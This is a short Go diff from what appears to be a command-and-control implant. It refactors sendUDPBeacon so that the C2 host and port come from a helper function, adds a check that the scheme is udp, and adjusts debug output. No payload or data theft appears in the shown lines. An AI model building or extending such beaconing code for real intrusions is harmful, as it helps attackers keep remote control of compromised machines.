@@ -6,7 +6,6 @@ package main
 import (
 	"fmt"
 	"net"
-	"strings"
 	"time"
 )
 
@@ -20,23 +19,18 @@ import (
 // datagram, so keep it within the link MTU; larger results must use a
 // connection-oriented transport.
 func sendUDPBeacon(body []byte) []byte {
-	raw := strings.TrimPrefix(C2URL, "udp://")
-	if raw == "" || raw == C2URL {
-		// Fall back to the active C2 URL index if Protocol is "udp" but the
-		// URL scheme wasn't updated.
-		raw = strings.TrimPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "udp://")
-	}
-	if raw == "" {
+	hostPort, scheme, ok := currentC2Dial()
+	if !ok || (scheme != "" && scheme != "udp") {
 		if Debug {
-			fmt.Printf("[!] UDP beacon: no udp:// endpoint configured\n")
+			fmt.Printf("[!] UDP beacon: no udp:// endpoint configured (scheme=%s)\n", scheme)
 		}
 		return nil
 	}
 
-	addr, err := net.ResolveUDPAddr("udp", raw)
+	addr, err := net.ResolveUDPAddr("udp", hostPort)
 	if err != nil {
 		if Debug {
-			fmt.Printf("[!] UDP beacon: resolve %s failed: %v\n", raw, err)
+			fmt.Printf("[!] UDP beacon: resolve %s failed: %v\n", hostPort, err)
 		}
 		return nil
 	}
